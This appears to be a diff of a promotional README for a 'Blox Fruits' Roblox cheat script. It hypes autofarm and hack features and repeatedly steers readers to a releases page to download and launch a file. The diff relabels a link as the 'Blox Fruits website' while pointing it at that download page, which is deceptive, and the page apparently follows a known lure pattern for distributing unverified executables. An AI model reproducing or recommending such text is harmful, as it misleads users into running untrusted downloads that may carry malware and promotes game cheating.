@@ -20,11 +20,11 @@ Welcome to the Blox Fruits Script GitHub repository! Here you'll find a powerful
 - **Topics:** bloxfruit-script, bloxfruits, bloxfruits-autofarm, bloxfruits-autofarm-script, bloxfruits-autofarm-script-download, bloxfruits-hack, bloxfruits-script, bloxfruitscript, free, fruit-notifier, lua, roblox, roblox-script, roblox-scripts
 
 ## Download the Script Here ⬇️
-[![Download Script](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/uploads/App.zip)
+[![Download Script](https://github.com/bane32/Blox-Fruits-Script-Roblox/releases)](https://github.com/bane32/Blox-Fruits-Script-Roblox/releases)
 
 If the link above ends with a file name, make sure to launch it in your game. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
 
 ## Additional Resources 🌟
-For more information and updates, feel free to visit the [Blox Fruits website](https://www.bloxfruits.com).
+For more information and updates, feel free to visit the [Blox Fruits website](https://github.com/bane32/Blox-Fruits-Script-Roblox/releases).
 
 Experience the full potential of Blox Fruits with this advanced script. Enhance your gameplay, level up faster, and enjoy all the benefits this script has to offer. Download now and embark on an exciting Roblox adventure like never before! 🎮✨
